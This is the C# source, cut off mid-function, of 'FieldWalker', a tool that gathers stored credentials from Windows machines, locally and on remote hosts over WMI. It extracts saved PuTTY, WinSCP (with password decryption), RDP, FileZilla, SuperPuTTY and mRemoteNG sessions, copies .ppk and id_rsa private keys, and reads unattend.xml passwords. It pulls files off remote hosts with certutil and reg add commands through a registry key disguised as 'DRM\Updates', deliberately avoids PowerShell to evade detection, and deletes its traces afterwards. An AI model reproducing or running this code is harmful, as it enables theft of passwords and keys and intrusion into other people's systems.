﻿/* Copyright 2022, Justin Palk

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation 
files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, 
modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the 
Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the 
Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE 
WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR 
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, 
ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

 */

/* 
 * FieldWalker was inspired by Arvanaghi's SessionGopher
 * 
 * Special thanks to thund3rstruck (https://www.codeproject.com/script/Membership/View.aspx?mid=2425996) for providing
 * good examples of how to use WMI in C#.
 * 
 * Also, a shoutout to Matt Grandy at 40N, as I spent a lot of time looking at his CIMplant code while building out some
 * of the functionality here.
 * 
 */

using System;
using System.Management;
using System.Text;
using System.Security.Principal;
using System.IO;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using System.Linq;
using System.Xml.Linq;
using System.Collections.Generic;

namespace FieldWalker
{

    public class session
    {
        public string remoteHost;
        public string port;
        public string username;
        public string password;
        public string pvtKeyFile;
        public string source;

        public override string ToString()
        {
            return "==> Source: " + source + " remoteHost: " + remoteHost + " port: " + port + " username: " + username + " password: " + password + " PKF: " + pvtKeyFile;
        }

        public string ToCsv()
        {
            return $"{source}, {remoteHost}, {port}, {username}, {password}, {pvtKeyFile}";

        }
        public session(string remoteHost, string port, string username, string password, string pvtKeyFile, string source)
        {
            this.remoteHost = remoteHost;
            this.port = port;
            this.username = username;
            this.password = password;
            this.pvtKeyFile = pvtKeyFile;
            this.source = source;
        }// end public session(string remoteHost...
    }// end public class session
    public class UserSessions
    {
        string sid;
        public string username;
        public List<session> sessions;
        public string hostname; 

        public UserSessions(string sid, string username, string hostname)
        {
            this.sid = sid;
            this.username = username;
            this.sessions = new List<session>();
            this.hostname = hostname;
        }
    }// end public static class UserSessions

       

    public class winScpDecryption
    {
        public string remainingCipherText;
        public uint decryptedResult;

        public winScpDecryption(string remainingCipherText, uint decryptedResult)
        {

            this.remainingCipherText = remainingCipherText;
            this.decryptedResult = decryptedResult;

        } // end public winScpDecryption(string remainingCipherText, uint decryptedResult)

    }// end public class winScpDecryption

   

    internal class Program
    {

        public static string Namespace = @"root\cimv2";

        static void Main(string[] args)
        {

            const string puttyPathEnding = @"\SOFTWARE\SimonTatham\PuTTY\Sessions";
            const string winSCPPathEnding = @"\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions";
            const string rdpPathEnding = @"\SOFTWARE\Microsoft\Terminal Server Client\Servers";

            List<UserSessions> userSessions = new List<UserSessions>();

            //variables for command-line arguments
            string[] computersList = null;
            string target = "";
            string remotingUsername = "";
            string remotingPassword = "";
            string remotingDomain = "";
            string outputDirectory = @".\";
            Boolean verbose = false;
            Boolean debug = false;
            string previousArgument = "";
            int numUsers = 0;


            foreach (string arg in args)
            {
                if (arg == "-d")
                {
                    previousArgument = "-d";
                }
                else if (arg == "-u")
                {
                    previousArgument = "-u";
                }
                else if (arg == "-p")
                {
                    previousArgument = "-p";
                }
                else if (arg == "-l")
                {
                    if (target != null){
                        Console.WriteLine("===> ERROR: Use only one of '-t' and '-l' ");
                        return;
                    }
                    previousArgument = "-l";
                }
                else if (arg == "-t")
                {
                    if (computersList != null){
                        Console.WriteLine("===> ERROR: Use only one of '-t' and '-l' ");
                        return;
                    }
                    previousArgument = "-t";
                }               
                else if (arg == "-o")
                {
                    previousArgument = "-o";
                }
                else if(arg == "-v")
                {
                    verbose = true;
                }
                else if(arg == "-g")
                {
                    debug = true;
                }
                else if(arg == "-h")
                {
                    Console.WriteLine("FieldWalker - a .NET tool for gathering credentials from known locations and files on Windows hosts, using WMI");
                    Console.WriteLine("Flags:");
                    Console.WriteLine("-h - Show this help message");
                    Console.WriteLine("-u - username for authentication");
                    Console.WriteLine("-p - password for authentication");
                    Console.WriteLine("-d - domain for authentication");
                    Console.WriteLine("-c - if using '-t' or '-l', also target the localhost");
                    Console.WriteLine("-t - remote host to target (incompatible with '-l')");
                    Console.WriteLine("-l - comma-separated list of remote hosts to target (incompatible with '-t')");
                    Console.WriteLine("-o - output directory for writing .ppk and id_rsa files (default: .\\ ");
                    Console.WriteLine("-v - generate more output");
                    Console.WriteLine("-d - generate a lot of debugging output");
                }
                else
                {
                    if (previousArgument == "-o")
                    {
                        outputDirectory = arg;
                        previousArgument = "";
                    }
                    else if (previousArgument == "-u")
                    {
                        remotingUsername = arg;
                        previousArgument = "";
                    }
                    else if (previousArgument == "-p")
                    {
                        remotingPassword = arg;
                        previousArgument = "";
                    }
                    else if (previousArgument == "-l")
                    {
                        computersList = arg.Split(',');
                        previousArgument = "";                        
                    }
                    else if (previousArgument == "-t")
                    {
                        target = arg;
                        previousArgument = "";                                              
                    }
                    else if (previousArgument == "-d")
                    {
                        remotingDomain = arg;
                        previousArgument = "";
                    }
                    else
                    {
                        Console.WriteLine("Argument '" + arg + "' is unrecognized.");
                        return;
                    }// end if(previousArgument == "-d")
                }// end if(arg == "-d")
            }//end foreach (string arg in args)

            if (File.Exists(outputDirectory + @"\results.txt"))
            {
                Console.WriteLine("[!] " + outputDirectory + @"\results.txt exists. Please delete the file or choose another output directory [!]");
                return;
            }
           
            //if the user supplied a target or target list, run FieldWalker remotely
            if ((target != "") || (computersList != null))
            {

                ConnectionOptions options;

                //if the user supplied credentials, configure the WMI connection to use them              
                if ((remotingUsername != "") && (remotingPassword != ""))
                {
                    options = new ConnectionOptions("MS_409", remotingUsername, remotingPassword,
                        "ntlmdomain:"+remotingDomain, System.Management.ImpersonationLevel.Impersonate,
                        System.Management.AuthenticationLevel.Default, true, null,
                        System.TimeSpan.MaxValue);
                }
                // If the user didn't supply credentials, we'll attempt the connection in the
                // current user context
                else
                {
                    options = new ConnectionOptions();
                }

                /*
                //debug #WMITEST -- this block is just for testing WMI connection
                //ManagementScope scope = new ManagementScope(@"\\" + target + @"\root\cimv2", options);
                string remoteTarget = @"\\" + target;
                Console.WriteLine("remoteTarget: " + remoteTarget);
                ManagementScope scope = new ManagementScope(remoteTarget);
                scope.Connect();
                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);


                ManagementObjectCollection queryCollection = searcher.Get();
                foreach (ManagementObject m in queryCollection)
                {
                    Console.WriteLine("Computer Name: {0}", m["csname"]);
                    Console.WriteLine("Windows Directory: {0}", m["WindowsDirectory"]);
                    Console.WriteLine("Windows OS: {0}", m["Caption"]);
                    Console.WriteLine("Version: {0}", m["Version"]);
                    Console.WriteLine("Mfgr: {0}", m["Manufacturer"]);
                }
                // end debug #WMITEST
                  */


                //build a connection for interacting with the registry

                ManagementScope registryScope = new ManagementScope(@"\\" + target + @"\root\DEFAULT:StdRegProv", options);
                registryScope.Connect();

                Console.WriteLine("FieldWalking " + target);

                ManagementClass registryManipulator = new ManagementClass(registryScope,
                    new ManagementPath("DEFAULT:StdRegProv"), new ObjectGetOptions());
                ManagementBaseObject methodParams = registryManipulator.GetMethodParameters("EnumKey");

                //get list of remote users from the registry
                methodParams["hDefKey"] = 2147483651;
                methodParams["sSubKeyName"] = "";

                ManagementBaseObject exitCode = registryManipulator.InvokeMethod("EnumKey", methodParams, null);
                
                string[] remoteUsers = (string[])exitCode["sNames"];

                //build a scope for checking on files
                ManagementScope fileScope = new ManagementScope(@"\\" + target + @"\root\cimv2", options);
                fileScope.Connect();

                //build a connection for executing remote processes
                ManagementScope processScope = new ManagementScope(@"\\" + target + @"\root\cimv2", options);
                processScope.Connect();

                ManagementClass processExecutor = new ManagementClass(processScope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
                
                foreach (string user in remoteUsers)
                {
                    if (Regex.Match(user, @"^S-1-5-21-[\d\-]+$", RegexOptions.ECMAScript).Success)
                    {
                        Console.WriteLine($"FieldWalking {user} on {target}");
                        //get the username from the SID
                        string accountName = new SecurityIdentifier(user).Translate(typeof(NTAccount)).ToString();

                        //add a UserSessions object to the list
                        userSessions.Add(new UserSessions(user, accountName, target));

                        //look for WinSCP Sessions                        
                        userSessions[numUsers].sessions.AddRange(
                                processRemoteWinSCPSessions(registryManipulator, methodParams, user));

                        //look for PuTTY Sessions
                        userSessions[numUsers].sessions.AddRange(
                            processRemotePuttySessions(registryManipulator, methodParams, user));

                        //look for RDP sessions
                        userSessions[numUsers].sessions.AddRange(
                           processRemoteRdpSessions(registryManipulator, methodParams, user));

                        //generate file paths for remote files 
                        //now we look for file-based credentials
                        string FileZillaPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\AppData\\Roaming\\FileZilla\\sitemanager.xml";
                        string SuperPuTTYPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\Documents\\SuperPuTTY\\Sessions.xml";
                        string mRemoteNGPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\AppData\\Roaming\\mRemoteNG\\confCons.xml";

                        //look for remote FileZillaSessions
                        if (debug)
                            Console.WriteLine("===> Checking for Remote FileZilla files ");

                        if (checkForRemoteFile(FileZillaPath, fileScope, debug))
                        {
                            XElement fileZillaSettings = XElement.Parse((retrieveRemoteFile(FileZillaPath, registryManipulator, processExecutor, target, processScope, debug)));
                            userSessions[numUsers].sessions.AddRange(processLocalFileZillaSessions(fileZillaSettings));

                        }

                        //look for remote MRemoteNG Sessions
                        if (checkForRemoteFile(mRemoteNGPath, fileScope, debug))
                        {
                            XElement mRemoteNGSettings = XElement.Parse((retrieveRemoteFile(mRemoteNGPath, registryManipulator, processExecutor, target, processScope, debug)));
                            userSessions[numUsers].sessions.AddRange(processLocalMRemoteNGSessions(mRemoteNGSettings));
                        }
                                                
                        //look for remote SuperPuTTY Sessions
                        if (checkForRemoteFile(SuperPuTTYPath, fileScope, debug))
                        {
                            XElement SuperPuTTYSettings = XElement.Parse((retrieveRemoteFile(SuperPuTTYPath, registryManipulator, processExecutor, target, processScope, debug)));
                            userSessions[numUsers].sessions.AddRange(processLocalSuperPuTTYSessions(SuperPuTTYSettings));
                        }

                        
                        numUsers++;
                    }// end if(Regex.Match(user, @"^S-1-5-21-[\d\-]+$", RegexOptions.ECMAScript).Success)
                   
                }//end foreach (string user in remoteUsers)

                //Here, we're doing general file searches not tied to a specific user
                //search for .ppk files (PuTTY private keys)
                List<string> ppkFiles = findRemoteFilesByExtension("ppk", fileScope, debug);
                if (debug)
                    Console.WriteLine("===> ppkFiles length: " + ppkFiles.Count.ToString());

                if (ppkFiles != null)
                {
                    foreach (string ppkFile in ppkFiles)
                    {

                        
                        //cull any links
                        if (ppkFile.IndexOf(".lnk") != -1)
                        {
                            if (debug)
                                Console.WriteLine("===> Link found in " + ppkFile + ". Bailing");

                            continue;
                        }

                        Console.WriteLine($"-> Found {ppkFile}");
                        
                        string fileContent = retrieveRemoteFile(ppkFile, registryManipulator, processExecutor, target, processScope, debug);

                        string outFileName = ppkFile.Replace(@"\", "_");
                        outFileName = outFileName.Replace(":", "_");
                        string outputFileFullPath = outputDirectory + @"\" + outFileName;
                        if (debug)
                            Console.WriteLine("===> outputFileFullPath:" + outputFileFullPath);

                        File.WriteAllText(outputFileFullPath, fileContent);
                        if (verbose)
                        {
                            Console.WriteLine("++++++++++++++++++++> PPK FILE <++++++++++++++++++++");
                            Console.WriteLine("===> source file: " + ppkFile);
                            Console.WriteLine("===> Host: " + target);
                            Console.WriteLine("===> outFileName:" + outFileName);
                            Console.WriteLine(" ");
                            Console.WriteLine(fileContent);
                            Console.WriteLine(" ");
                            Console.WriteLine("++++++++++++++++++++> END PPK FILE <++++++++++++++++++++");
                        }
                    }
                }
                else
                {
                    if (verbose)
                        Console.WriteLine("===> No PPK files found!");

                }

                //search for id_rsa files
                List<string> idRsaFiles = findRemoteFilesByName("id_rsa", fileScope, debug);
                if (idRsaFiles != null)
                {
                    foreach (string idRsaFile in idRsaFiles)
                    {
                        //cull any links
                        if (idRsaFile.IndexOf(".lnk") != -1)
                        {
                            continue;
                        }
                        Console.WriteLine($"-> Found {idRsaFile}");

                        string fileContent = retrieveRemoteFile(idRsaFile, registryManipulator, processExecutor, target, processScope, debug);
                        string outFileName = idRsaFile.Replace(@"\", "_");
                        outFileName = outFileName.Replace(":", "_");
                        string outputFileFullPath = outputDirectory + @"\" + outFileName;
                        File.WriteAllText(outputFileFullPath, fileContent);
                        if (verbose)
                        {
                            Console.WriteLine("++++++++++++++++++++> ID_RSA FILE <++++++++++++++++++++");
                            Console.WriteLine("===> Source file: " + idRsaFile);
                            Console.WriteLine("===> Host: " + target);
                            Console.WriteLine("===> outFileName:" + outFileName);
                            Console.WriteLine(" ");
                            Console.WriteLine(fileContent);
                            Console.WriteLine(" ");
                            Console.WriteLine("++++++++++++++++++++> END ID_RSA FILE <++++++++++++++++++++");
                        }
                    }

                }//end if (idRsaFiles != null)
                else
                {
                    if (verbose)
                        Console.WriteLine("===> No id_rsa files found");

                }

                //search for unattend.xml files
                //add a UserSessions object to the list - because unattend.xml accounts don't get filed under regular user
                userSessions.Add(new UserSessions("N/A", "N/A", target));
                List<string> unattendXmlFiles = findRemoteFilesByNameAndExtension("xml", "unattend", fileScope, debug);
                if (unattendXmlFiles != null)
                {
                    foreach (string unattendXmlFile in unattendXmlFiles)
                    {
                        //cull any links
                        if (unattendXmlFile.IndexOf(".lnk") != -1)
                        {
                            continue;
                        }
                      
                        XElement unattendXmlPasswords = XElement.Parse(retrieveRemoteFile(unattendXmlFile, registryManipulator, processExecutor, target, processScope, debug));
                        userSessions[numUsers].sessions.AddRange(processLocalUnattendFiles(unattendXmlPasswords, target, "unattend.xml", debug));
                    }//end foreach (string unattendXmlFile in unattendXmlFiles)
                }//end  if (unattendXmlFiles != null)
                //because unattend.xml entries get their own "user number" in the sessions list
                numUsers++;

            }//end if ((target != "") || (computersList != null))

            //Run FieldWalker locally
            Console.WriteLine("Running FieldWalker on the local host");
            RegistryKey hku = Registry.Users;
            RegistryKey hklm = Registry.LocalMachine;
           // numUsers = 0;

            string[] users = hku.GetSubKeyNames();


            foreach (string userHive in users)
            {
                if (Regex.Match(userHive, @"^S-1-5-21-[\d\-]+$", RegexOptions.ECMAScript).Success)
                {

                    //get the username from the SID
                    string accountName = new SecurityIdentifier(userHive).Translate(typeof(NTAccount)).ToString();

                    //create a new userSessions object                    
                    userSessions.Add(new UserSessions(userHive, accountName, "localhost"));

                    // we start by looking for credentials in the registry
                    // look for putty sessions
                    using (RegistryKey puttyKey = hku.OpenSubKey(userHive + puttyPathEnding))
                    {
                        if (puttyKey != null)
                        {
                            userSessions[numUsers].sessions.AddRange(processLocalPuttySessions(puttyKey));
                        }

                    }
                    //debug
                    //Console.WriteLine("PuTTY");
                    //Console.WriteLine("# of userSessions.sessions: " + userSessions[numUsers].sessions.Count.ToString());
                    // look for local winSCP sessions
                    using (RegistryKey winSCPKey = hku.OpenSubKey(userHive + winSCPPathEnding))
                    {
                        if (winSCPKey != null)
                        {
                            userSessions[numUsers].sessions.AddRange(processLocalWinScpSessions(winSCPKey));
                        }
                    }
                    //debug
                    // Console.WriteLine("WinSCP");
                    //Console.WriteLine("# of userSessions.sessions: " + userSessions[numUsers].sessions.Count.ToString());
                    //look for local RDP sessions
                    using (RegistryKey rdpKey = hku.OpenSubKey(userHive + rdpPathEnding))
                    {
                        if (rdpKey != null)
                        {
                            userSessions[numUsers].sessions.AddRange(processLocalRdpSessions(rdpKey));
                        }
                    }
                    //debug
                    // Console.WriteLine("RDP");
                    // Console.WriteLine("# of userSessions.sessions: " + userSessions[numUsers].sessions.Count.ToString());

                    //now we look for file-based credentials
                    string FileZillaPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\AppData\\Roaming\\FileZilla\\sitemanager.xml";
                    string SuperPuTTYPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\Documents\\SuperPuTTY\\Sessions.xml";
                    string mRemoteNGPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\AppData\\Roaming\\mRemoteNG\\confCons.xml";                                      
                   
                    if (File.Exists(FileZillaPath))
                    {
                        //debug
                        Console.WriteLine("FileZilla sessions file found");
                        XElement fileZillaSettings = XElement.Load(FileZillaPath);
                        userSessions[numUsers].sessions.AddRange(processLocalFileZillaSessions(fileZillaSettings));
                    }// end if (File.Exists(FileZillaPath))

                    if (File.Exists(SuperPuTTYPath))
                    {
                        //debug
                        Console.WriteLine("SuperPuTTY sessions file found");
                        XElement SuperPuTTYServers = XElement.Load(SuperPuTTYPath);
                        userSessions[numUsers].sessions.AddRange(processLocalSuperPuTTYSessions(SuperPuTTYServers));
                    }// end if (File.Exists(SuperPuTTYPath))
                    if (File.Exists(mRemoteNGPath))
                    {
                        XElement mRemoteNGServers = XElement.Load(mRemoteNGPath);
                        userSessions[numUsers].sessions.AddRange(processLocalMRemoteNGSessions(mRemoteNGServers));
                    }// end if (File.Exists(mRemoteNGPath))
                    
                    
                    numUsers++;
                }// end if (userHive.StartsWith("S -1-5-21")
            }// end foreach (string userHive in users)
             //we search for unattend.xml files separately, so we don't repeat them on a per-user basis
             //add a UserSessions object to the list - because unattend.xml accounts don't get filed under regular user
            userSessions.Add(new UserSessions("N/A", "N/A", "localhost"));
            //There's six different unattend.xml files
            string[] unattends = { "C:\\Windows\\Panther\\unattend.xml", "C:\\Windows\\Panther\\unattended.xml", "C:\\Windows\\Panther\\unattend\\unattend.xml",
                    "C:\\Windows\\Panther\\unattend\\unattended.xml", "C:\\Windows\\System32\\SysPrep\\unattend.xml", "C:\\Windows\\System32\\SysPrep\\Panther\\unattend.xml"};
            foreach (string unattendedFile in unattends)
            {
                if (File.Exists(unattendedFile))
                {
                    userSessions[numUsers].sessions.AddRange(processLocalUnattendFiles(XElement.Load(unattendedFile), "localhost", unattendedFile, debug));
                }

            }//end foreach( string unattendedFile in unattends)

            //open an output file
            string finalOutputFileName = outputDirectory + @"\results.csv";
            

            Console.WriteLine($"-> Writing results to {finalOutputFileName}");

            Console.WriteLine("-> Final Results");

            var outputLines = new List<string>();
            outputLines.Add("Source, Remote Host, Port, Username, Password, Private Key File");

            foreach (UserSessions user in userSessions)
            {
                
                Console.WriteLine($">>> Credentials for {user.username} found on {user.hostname}");
                outputLines.Add($">>> Credentials for {user.username} found on {user.hostname}");

                foreach (session connection in user.sessions)
                {
                    Console.WriteLine(connection.ToString());
                    outputLines.Add(connection.ToCsv());
                }
            }
            File.WriteAllLines(finalOutputFileName, outputLines.ToArray());
            Console.WriteLine("End");

        }// end static void Main(string[] args)

        
        static bool checkForRemoteFile(string path, ManagementScope scope, Boolean debug) {

            string newPath = path.Replace("\\", "\\\\");

            if(debug)
                Console.WriteLine("===> Checking for: " + path);
            ObjectQuery query = new ObjectQuery(@"SELECT * FROM CIM_DataFile Where Name='" + newPath + @"' ");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            if(debug)
                Console.WriteLine("===> # of Query Results: " + queryCollection.Count.ToString());

            if (queryCollection.Count == 0)
            {
                if(debug)
                    Console.WriteLine("### Note: " + path + " does not exist.");
                return false;
            }

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                if (Convert.ToInt32(wmiObject["FileSize"]) == 0)
                {
                    if (debug)
                        Console.WriteLine("### Note: " + path + " exists, but is empty (zero bytes). ");
                    return false;
                }

                if (queryCollection.Count == 0)
                {
                    if (debug)
                        Console.WriteLine("### Note: " + path + " does not exist. ");
                    return false;
                }
                                
            }//foreach (var o in queryCollection)

            return true;

        }//end static bool CheckForRemoteFile(string path ManagementScope scope)

        static List<string> findRemoteFilesByName(string fileName, ManagementScope scope, Boolean debug)
        {
            ObjectQuery query = new ObjectQuery($"SELECT * FROM CIM_DataFIle Where FileName='{fileName}'");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            if (debug)
                Console.WriteLine("===> # of Query Results: " + queryCollection.Count.ToString());

            if (queryCollection.Count == 0)
            {
                if (debug)
                    Console.WriteLine("### Note: " + fileName + " not found.");
                return null;
            }
            List<string> foundFiles = new List<string>();
            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
               
                if (Convert.ToInt32(wmiObject["FileSize"]) == 0)
                {
                    continue;
                }
                foundFiles.Add(wmiObject["Name"].ToString());
                if (debug)
                    Console.WriteLine("===> Found :" + wmiObject["Name"].ToString());

            }//foreach (var o in queryCollection)

            return foundFiles;
        }// static string[] searchForRemoteFileByName(string fileName, ManagementScope scope)

        static List<string> findRemoteFilesByExtension(string extension, ManagementScope scope, Boolean debug)
        {
            ObjectQuery query = new ObjectQuery($"SELECT * FROM CIM_DataFIle Where Extension='{extension}'");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            if (debug)
                Console.WriteLine("===> # of Query Results: " + queryCollection.Count.ToString());

            if (queryCollection.Count == 0)
            {
                if (debug)
                    Console.WriteLine("### Note: No file found with extension '" + extension + "'.");
                return null;
            }
            List<string> foundFiles = new List<string>();
            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;

                if (Convert.ToInt32(wmiObject["FileSize"]) == 0)
                {
                    continue;
                }
                foundFiles.Add(wmiObject["Name"].ToString());
                if (debug)
                    Console.WriteLine("===> Found :" + wmiObject["Name"].ToString());

            }//foreach (var o in queryCollection)

            if (debug)
                Console.WriteLine("===> foundFiles length: " + foundFiles.Count.ToString());

            return foundFiles;
        }// static string[] searchForRemoteFileByExtension(string extension, ManagementScope scope, Boolean debug)

        static List<string> findRemoteFilesByNameAndExtension(string extension, string name, ManagementScope scope, Boolean debug)
        {
            ObjectQuery query = new ObjectQuery($"SELECT * FROM CIM_DataFIle Where FileName LIKE '{name}%' AND Extension='{extension}'");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            if (debug)
                Console.WriteLine("===> # of Query Results: " + queryCollection.Count.ToString());

            if (queryCollection.Count == 0)
            {
                if (debug)
                    Console.WriteLine("===> Note: No file found with name: '" + name + "' and extension '" + extension + "'.");
                return null;
            }
            List<string> foundFiles = new List<string>();
            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;

                if (Convert.ToInt32(wmiObject["FileSize"]) == 0)
                {
                    continue;
                }
                foundFiles.Add(wmiObject["Name"].ToString());
                if (debug)
                    Console.WriteLine("===> Found :" + wmiObject["Name"].ToString());

            }//foreach (var o in queryCollection)

            if (debug)
                Console.WriteLine("===> foundFiles length: " + foundFiles.Count.ToString());

            return foundFiles;
        }// static string[] searchForRemoteFileByNameAndExtension(string extension, ManagementScope scope, Boolean debug)


        static string retrieveRemoteFile(string path, ManagementClass registryManipulator, 
            ManagementClass processExecutor, string target, ManagementScope processScope, Boolean debug)
        {
            //check to see whether our temporary file exists for some reason
            if (checkForRemoteFile("C:\\windows\\tasks\\sched.bin", processScope, debug))
            {
                //if it does, delete it
                if (debug)
                    Console.WriteLine("===> Deleting C:\\windows\\tasks\\sched.bin");

                ManagementObject fileHandle = new ManagementObject(processScope, new ManagementPath(@"CIM_DataFile.Name='C:\\windows\\tasks\\sched.bin'"), null);                               
                ManagementBaseObject outParms = fileHandle.InvokeMethod("Delete", null, null);
            }
            //before we begin, delete our key out of the registry
            ManagementBaseObject methodParams = registryManipulator.GetMethodParameters("DeleteKey");
            const string carrierPathEnding = @"Software\Microsoft\DRM\Updates";
            methodParams["hDefKey"] = 2147483650;
            methodParams["sSubKeyName"] = carrierPathEnding;
            ManagementBaseObject exitCode = registryManipulator.InvokeMethod("DeleteKey", methodParams, null);
            System.Threading.Thread.Sleep(500);

            //what we're going to do here is use certutil to base64-encode our file into a temp file (c:\windows\tasks\sched.bin)
            //then we strip off the header and footer lines from that file and load the remaining ones into a registry key we create
            //This'd be easier using powershell, but so many places alert on powershell these days, so yay for certutil,
            //old-school DOS for loops and findstr...
            string command1 = @"certutil -encode " + path + @" c:\windows\tasks\sched.bin";
            string command2 = @"cmd /V:on /c ""set /a count=0 && for /f %x in ('type c:\windows\tasks\sched.bin ^| findstr /v CERTIFICATE') do (set /a count += 1 & reg add HKLM\Software\Microsoft\DRM\Updates /v !count! /t REG_SZ /d %x)"" ";
         
            methodParams = processExecutor.GetMethodParameters("Create");
            methodParams["CommandLine"] = command1;
            if (debug)
                Console.WriteLine("===> Executing " + command1);

            exitCode = processExecutor.InvokeMethod("Create", methodParams, null);
            if (debug)
                Console.WriteLine("===> Result: " + exitCode["ReturnValue"].ToString());

            methodParams["CommandLine"] = command2;
            if (debug)
                Console.WriteLine("===> Executing " + command2);

            exitCode = processExecutor.InvokeMethod("Create", methodParams, null);

            if (debug)
            {
                Console.WriteLine("===> Result: " + exitCode["ReturnValue"].ToString());
                Console.WriteLine("===> Remote Commands Completed");
            }

            System.Threading.Thread.Sleep(5000);
            methodParams = registryManipulator.GetMethodParameters("EnumValues");
            methodParams["hDefKey"] = 2147483650;
            methodParams["sSubKeyName"] = carrierPathEnding;
            
            if (debug)
                Console.WriteLine("===> Prepping for registry call");
            
            exitCode = registryManipulator.InvokeMethod("EnumValues", methodParams, null);

            if (debug)
            {
                Console.WriteLine("===> Registry call returned");
                Console.WriteLine("===> ExitCode: " + exitCode["ReturnValue"].ToString());
            }

            string[] values = (string[])exitCode["sNames"];

            if (debug)
                Console.WriteLine("===> Count of Values: " + values.Length.ToString());

            string b64data = "";
            methodParams = registryManipulator.GetMethodParameters("GetStringValue");
            methodParams["hDefKey"] = 2147483650;
            methodParams["sSubKeyName"] = carrierPathEnding;

            if (debug)
                Console.WriteLine("===> Getting Values");
            //here we build up our base64 string from individual lines/values in the registry
            foreach (string line in values)
            {
                methodParams["sValueName"] = line;
                if (debug)
                    Console.WriteLine("===> Getting Value " + carrierPathEnding + @"\" + line);
                exitCode = registryManipulator.InvokeMethod("GetStringValue", methodParams, null);
                if (debug)
                    Console.WriteLine("===> Got value");
                b64data += exitCode["sValue"].ToString();
            }//end foreach (string line in values)
            if (debug)
            {
                Console.WriteLine("===> b64data <===");
                Console.WriteLine(b64data);
                Console.WriteLine("===> END b64data <===");
            }

            //convert the b64 string to bytes
            Byte[] b64DataBytes = Convert.FromBase64String(b64data);


            //having loaded our file into the registry, delete our temp file
            if (checkForRemoteFile("C:\\windows\\tasks\\sched.bin", processScope, debug))
            {
                //after confirming the file exists, delete it
                if (debug)
                    Console.WriteLine("===> Deleting C:\\windows\\tasks\\sched.bin");

                ManagementObject fileHandle = new ManagementObject(processScope, new ManagementPath(@"CIM_DataFile.Name='C:\\windows\\tasks\\sched.bin'"), null);
                ManagementBaseObject outParms = fileHandle.InvokeMethod("Delete", null, null);
            }

            //before we return, delete our key out of the registry
            methodParams = registryManipulator.GetMethodParameters("DeleteKey");
            methodParams["hDefKey"] = 2147483650;
            methodParams["sSubKeyName"] = carrierPathEnding;
            exitCode = registryManipulator.InvokeMethod("DeleteKey", methodParams, null);

            return Encoding.UTF8.GetString(b64DataBytes);
            
            //return null;
        }// end static string retrieveRemoteFile(string path, ManagementScope scope)

        static List<session> processRemoteWinSCPSessions(ManagementClass registryManipulator,
            ManagementBaseObject methodParams, string user)
        {
            List<session> winScpSessions = new List<session>();
            const string winSCPPathEnding = @"\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions";
            methodParams["sSubKeyName"] = user + winSCPPathEnding;

            ManagementBaseObject exitCode = registryManipulator.InvokeMethod("EnumKey", methodParams, null);
            
            if (exitCode["returnValue"].ToString() == "0")
            {
                string[] winScpRegistrySessions = (string[])exitCode["sNames"];
                methodParams = registryManipulator.GetMethodParameters("GetStringValue");
                methodParams["hDefKey"] = 2147483651;
                string hostname = "";
                string port = "";
                string username = "";
                string password = "";
                string pvtKeyFile = "";

                Console.WriteLine($"-> Found {winScpRegistrySessions.Length.ToString()} WinSCP sessions");

                foreach (string winScpRegistrySession in winScpRegistrySessions)
                {
                    hostname = "";
                    port = "";
                    username = "";
                    password = "";
                    pvtKeyFile = "";
                    if (winScpRegistrySession == "Default%20Settings")
                    {
                        continue;
                    }
                    methodParams["sSubKeyName"] = user + winSCPPathEnding + @"\" +
                        winScpRegistrySession;

                    methodParams["sValueName"] = "HostName";
                    exitCode = registryManipulator.InvokeMethod("GetStringValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        hostname = (string)exitCode["sValue"];
                    }
                    methodParams["sValueName"] = "UserName";
                    exitCode = registryManipulator.InvokeMethod("GetStringValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        username = (string)exitCode["sValue"];
                    }
                    methodParams["sValueName"] = "Password";
                    exitCode = registryManipulator.InvokeMethod("GetStringValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        password = (string)exitCode["sValue"];
                        string encryptedPassword = password;
                        try
                        {
                            password = decryptWinScpPassword(hostname, username, password);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(" *** Error decrypting WinSCP password. Saving encrypted password to output");
                            password = encryptedPassword;
                        }
                    }
                    //No idea why WinSCP saves private keys as "PublicKeyFile" in the registry
